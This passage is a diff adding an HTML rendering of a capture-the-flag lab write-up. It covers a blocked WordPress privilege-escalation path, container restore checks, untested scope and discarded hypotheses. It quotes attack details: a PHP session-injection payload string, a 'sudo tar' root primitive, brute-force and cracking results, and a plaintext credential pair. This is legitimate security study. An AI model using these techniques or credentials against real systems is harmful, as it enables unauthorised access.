+<td><code>22/tcp</code> open, <code>Supported authentication methods: publickey, password</code>, banner <code>SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14</code> — <strong>no <code>authorized_keys</code> exists anywhere on the filesystem</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>So the reward leg is blocked, and I am reporting it as blocked rather than as a lab defect.</strong>
+The escalation that <em>would</em> work is fully specified and measured: become <code>webmaster</code>, then
+<code>sudo /usr/bin/tar</code> gives a root write primitive (lab 61's hop 7, same primitive, different
+rung), and root reads <code>/root/root.txt</code>. <strong>What is missing is a credential</strong>, and the two
+candidates are <code>admin_master</code>'s (F3: not recovered in 483 466 186 candidates) and a
+<code>webmaster</code> SSH password (yescrypt, and §10's tooling limit). This is the &quot;an escalation that
+did not work is its own finding&quot; case from the RUNBOOK, filed separately, because merging it
+with the chain would tell the reader that patching the account lifecycle yields root. <strong>It does
+not.</strong> The account lifecycle yields the <em>path</em> to WordPress; the WordPress leg is gated on
+something the lifecycle does not touch.</p>
+<p><strong>This is the twenty-eighth lab in this series with no <code>DL{}</code> obtained by the chain</strong>, and the
+first where the reward's existence is unambiguous (two files, both <code>DL{…}</code>) while remaining
+unreachable from the demonstrated attack surface.</p>
+<hr />
+<h2 id="9-restore">9. Restore</h2>
+<p><code>docker rm -f cuentaatras_container</code> then <code>docker run -d</code> <strong>from the image</strong>, verified with
+<strong>eight positive checks</strong> — each one a value that had to come back, never an absence:</p>
+<pre><code>1 front page                     : 200  503 bytes
+2 wp_version from the image      : 6.9.1          (1 match)
+3 ctf_db.users                   : 0 rows         (every account I created is gone)
+4 ctf_db.verifications           : 0 rows         (every token is gone)
+5 wp_users                       : 1 admin_master 49308bda8b5e0ab9688ec4bedf6d572c
+6 portal answers                 : 200 66138 bytes
+7 my accounts matching my prefixes: 0 rows
+8 wpvivid_api_token              : md5 4c180c17019efed1ea607839d67b418b  &lt;- the SHIPPED value
+</code></pre>
+<p>Check 8 is the one that matters: it is the third distinct hash of that option (§7.4), and it
+proves the unauthenticated rotation in F5 was undone by recreating the container rather than
+by any edit of mine.</p>
+<p><strong>Two session files dated <code>2026-09-30</code> remain</strong>, and I am reporting them rather than claiming
+zero artefacts: they were created by my own two post-restore verification requests, because
+<code>index.php:2</code> calls <code>session_start()</code> on every page view. The container is freshly created from
+the image, so they are the only thing in it I produced, and they are 0-byte <code>0600 www-data</code>
+files with no content. Everything else in the lab is as shipped.</p>
+<hr />
+<h2 id="10-not-tested-scope-not-gaps-in-effort">10. NOT tested (scope, not gaps in effort)</h2>
+<ul>
+<li><strong>Recovering <code>admin_master</code>'s password.</strong> 483 466 186 candidates hashed, 0 hits, positive
+control green (§4, F3). Not attempted: a GPU cracker, a rules-based attack, or a corpus larger
+than the two wordlists on this host. <strong>This is a limit of available tooling and is not
+evidence that the password is strong.</strong></li>
+<li><strong>Cracking the <code>webmaster</code> / <code>bond</code> / <code>ethan</code> shadow hashes.</strong> All three are <strong>yescrypt</strong>
+(<code>$y$j9$…</code>). This host has <strong>no cracker for it</strong>: Python 3.14 has removed the <code>crypt</code> module,
+there is no <code>mkpasscrypt</code>, no <code>passlib</code>, and <code>openssl passwd</code> does not implement yescrypt.
+<strong>Work count: zero candidates tested.</strong> Per rule 14, that is <strong>untested</strong>, and it is listed
+here rather than as a negative.</li>
+<li><strong>A <code>webmaster → sudo tar → root</code> chain.</strong> Never attempted, because webmaster was never
+obtained. The rung's <em>capability</em> is proven (C9); its <em>reachability</em> is not tested.</li>
+<li><strong>Exercising <code>wpvivid</code>'s unauthenticated <code>send_to_site</code> file write.</strong> I did not forge a
+<code>wpvivid_content</code> ciphertext, because that requires the site keypair, which lives only in
+<code>wp_options</code>. <strong>Not tested, not claimed.</strong> The gate held against me (C6); whether it holds
+against a holder of the key is unknown to me.</li>
+<li><strong>The migration-URL disclosure at <code>class-wpvivid-migrate.php:966</code> and <code>:1026</code>.</strong> Both
+<code>echo</code> a URL containing the site's <strong>public key</strong> as <code>&amp;token=…</code>, and I read that from the
+source. I did <strong>not</strong> exercise it: the receiving end is a third-party service, and the
+engagement constraints forbid third-party infrastructure and public token-capture hosts. The
+finding is therefore sourced to <code>file:line</code> and <strong>not</strong> runtime-demonstrated, and that
+distinction is deliberate.</li>
+<li><strong><code>generate_migration_key.php</code>.</strong> Returns <code>500</code> and the body does not match any error string I
+grepped for; I did not chase it. <strong>Work count: 1 request.</strong></li>
+<li><strong>Any CVE in <code>wpvivid-backuprestore</code> 0.9.123.</strong> I read the plugin's own code for sinks and
+authorisation, and filed what the code shows. I did not attempt a known-CVE path, and a real
+third-party CVE would be documented, never tested.</li>
+<li><strong>Whether the target self-updates under load.</strong> §5: the exposure is identical to lab 108's
+and it did not fire. Untested under traffic.</li>
+<li><strong>The WordPress REST surface beyond <code>/wp/v2/users</code>.</strong> One request. The plugin registers <strong>zero</strong>
+REST routes (<code>grep -rn register_rest_route</code> → no hits), and <code>users_can_register=0</code>, so there
+was no reason to spend the budget.</li>
+</ul>
+<h2 id="11-discarded-with-reason">11. Discarded with reason</h2>
+<table>
+<thead>
+<tr>
+<th>Hypothesis</th>
+<th>Why discarded</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>The confirmation token is not bound to the account it confirms, via PHP's <code>session.upload_progress</code> primitive</td>
+<td><code>session.upload_progress.enabled=On</code> and <code>session.use_strict_mode=Off</code>, so <code>$_SESSION</code> is attacker-writable in principle. I injected <code>PHP_SESSION_UPLOAD_PROGRESS=x|i:1;verify_user|s:N:&quot;&lt;target&gt;&quot;;</code> into a second session, but <strong><code>session.upload_progress.cleanup=On</code> removed it at request end</strong>: the session file was <strong>0 bytes</strong> (<code>sess_5je85pngo9oo8k1q28d6icm8k2</code>) and <code>verify.php</code> returned <code>302 → register.php</code>, i.e. <code>verify_user</code> was not set. A concurrent-read race was <strong>not</strong> attempted. <strong>The token binding held against this vector</strong> — the session is a weak boundary in principle and an intact one in this configuration. <em>Instrumentation note: I read the session file with the <strong>username</strong> in the filename instead of the <strong>session id</strong>, so the first read reported <code>MISSING</code> for a file that existed — caught by listing the directory by mtime.</em></td>
+</tr>
+<tr>
+<td>The 4-digit code is time-seeded and therefore predictable without guessing</td>
+<td>PHP 8.3's <code>rand()</code> is <code>mt_rand()</code>, auto-seeded from a CSPRNG since 7.1, so wall-clock prediction is out. I did not attempt to recover <code>mt_rand</code>'s internal state. The finding does not depend on it: F1 stands on &quot;no delivery + no attempt counter&quot;, both measured, with the brute force succeeding in 0.9 s</td>
+</tr>
+<tr>
+<td>A second registration for an existing username overwrites its token via <code>ON DUPLICATE KEY UPDATE</code> (<code>register.php:16-17</code>)</td>
+<td><strong>Dead code, proven three ways</strong> — identical, upper-case (<code>utf8mb4_general_ci</code>), and trailing-space username all hit <code>UNIQUE KEY username</code> first and are refused at <code>register.php:22-24</code>; the <code>verifications</code> row count stayed at 1. C2</td>
+</tr>
+<tr>
+<td>A SQL injection in the lifecycle</td>
+<td>every statement is a prepared statement with <code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code> (<code>db.php:8</code>) and bound parameters. <code>grep</code> of the six files finds no string-concatenated query. <strong>6 files read in full</strong></td>
+</tr>
+<tr>
+<td>A mail/SMS capture surface exists somewhere in the lab and the code is readable there</td>
+<td>§0's grep, <code>which</code>, <code>/var/mail</code>, and <code>ps</code>. Zero. There is no capture surface because there is no sender</td>
+</tr>
+<tr>
+<td>The 4-digit code leaks into a log, an error message or the HTML</td>
+<td>the only place it appears is the <code>verifications</code> row. <code>verify.php</code> renders <code>$time_left</code> and the error string, never the code; <code>register.php</code> echoes nothing after the redirect</td>
+</tr>
+<tr>
+<td>The <code>wpvivid</code> <code>wp_ajax_nopriv_*</code> restore endpoints are an unauthenticated database-restore primitive</td>
+<td>four of them are registered for logged-out clients (<code>class-wpvivid-restore2.php:21-31</code>) but every body opens with <code>check_ajax_referer</code> + <code>current_user_can('manage_options')</code> (<code>do_restore()</code> at <code>:604-611</code>). The registration is a decoy; the body is the control. C8, C5</td>
+</tr>
+<tr>
+<td><code>wpvivid</code>'s AJAX surface has a missing <code>permission_callback</code> (the lab-61 shape)</td>
+<td>audited 8 of the 90 registered actions' handler bodies; every one opens with the same two-line guard. C5, with a byte-level control</td>
+</tr>
+<tr>
+<td><code>mysqld</code> running as root lets <code>LOAD_FILE('/root/root.txt')</code> reach the reward</td>
+<td><code>ps -o uid -C mariadbd</code> → <code>Uid: 103 103 103 103</code> (<code>mysql</code>/<code>mysql</code>). The <strong>wrapper</strong> <code>mariadbd-safe</code> (pid 72) is uid 0, and reading that first is exactly how one would report the wrong identity</td>
+</tr>
+<tr>
+<td>A second virtual host, a renamed login path, or a backup artefact discloses a credential (labs 61/108/90 shapes)</td>
+<td>one vhost (<code>000-default.conf</code>, <code>DocumentRoot /var/www/html</code>, <code>ServerName</code> unset); <code>/wp-login.php</code> → 200 canonical, nothing renamed; no <code>.sql</code>/<code>.bak</code>/<code>.zip</code>/<code>.tar</code> under any document root; <code>/wp-config.php</code> → 200 with 0 bytes; <code>phpMyAdmin</code> absent</td>
+</tr>
+<tr>
+<td><code>[wordpress-session-cookie]</code> alone authenticates (lab 108's inverse finding)</td>
+<td>not re-tested. <code>wp_config.php</code> salts are the placeholder and core discards them (C7), and I have no WordPress session to test with. <strong>Not claimed either way</strong></td>
+</tr>
+<tr>
+<td>The <code>ethan:pfLmWVz2EGKGpRCmACTP</code> pair in <code>copy2321_.php</code> is a credential for this lab</td>
+<td>it belongs to a different lab in the series (<code>Host: localhost:8080</code>, <code>GET /productos/lista</code>, persona &quot;Ethan&quot;). Not attempted against SSH, and the shadow hashes are yescrypt anyway (§10)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="12-what-feeds-forward">12. What feeds forward</h2>
+<p><strong>The rule this lab earns, and it extends rather than creates.</strong></p>
+<p>Labs 61 and 108 built the WordPress <em>platform</em> section: cookies, salts, <code>active</code> vs <code>present</code>,
+enumeration. This lab is the first <strong>account-lifecycle</strong> entry, and what it contributes is not
+a new class but a <strong>new entry criterion</strong> for a class the corpus has as &quot;credential attack&quot;:</p>
+<blockquote>
+<p>**For every token the lifecycle issues — confirmation, password reset, admin-email
+confirmation, session, API key — the first question is not &quot;how strong is it&quot; and not &quot;where
+is it stored&quot;. It is: <em>what is the channel, and does it exist?</em> Enumerate the tokens the
+product issues; for each, name the delivery function and point at it in the source. If the
+function is absent, the token's strength is irrelevant and the transition is unguarded — and
+the correct entry criterion becomes <em>&quot;is there an honest path to the confirmed state?&quot;</em>, not
+<em>&quot;can I guess the code?&quot;</em>. A 4-digit code with no counter is only interesting <strong>because</strong>
+nobody can receive it.</p>
+<p>Three corollaries, each with its own measured instance here:</p>
+<ul>
+<li><strong>A gate that nobody can satisfy is a denial of service wearing a security control.</strong> Do
+not ship a mint-and-check with no transport; that is a lab that cannot be solved honestly.</li>
+<li><strong>A client-side field is not an account property.</strong> <code>email</code> and <code>phone</code> are collected,
+stored, and read by nothing (F6), while the field the application <em>does</em> enforce —
+<code>username</code> — is the one the user invents. Invert that ordering and the account list stops
+being an identity boundary.</li>
+<li><strong>The state machine's own housekeeping is attack surface.</strong> The cleanup branch that deletes
+an abandoned account is reachable by naming a row (F7). In a lifecycle where a session can
+be forged — or simply shared, or replayed — a <code>DELETE</code> in a request handler is a primitive,
+and it should be a scheduled job.</li>
+</ul>
+<p><strong>And the token-storage class, third instance in this corpus</strong> (after 172's CSRF token in the
+cookie and 108's backup credential in the docroot): here it is a <strong>4-digit token in a
+plaintext table whose credential sits in a served PHP file</strong> (F2), and a <strong>2048-bit RSA
+private key in <code>wp_options</code> that the whole internet can rotate</strong> (F4, F5). The pattern across
+all three is the same and it is worth stating once: <em>ask where the token lives, then ask who
+can read the thing that guards it, and treat the distance between those two answers as the
+finding.</em></p>
+</blockquote>
+<p><strong>For the parent, not for <code>method/</code>:</strong> the two rows this writeup is evidence for are
+(a) <em>credential attack</em> — the discriminator is now <strong>&quot;is the token deliverable?&quot; before it is
+&quot;is the token strong?&quot;</strong>, and (b) a <strong>new section on the account lifecycle</strong>, justified against
+the existing headings because none of them has an entry criterion: the existing rows are all
+<em>sinks</em> (file upload, XXE, SSTI, SQLi, deserialisation, LFI), and this lab's entire attack
+surface is a <strong>transition</strong>.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
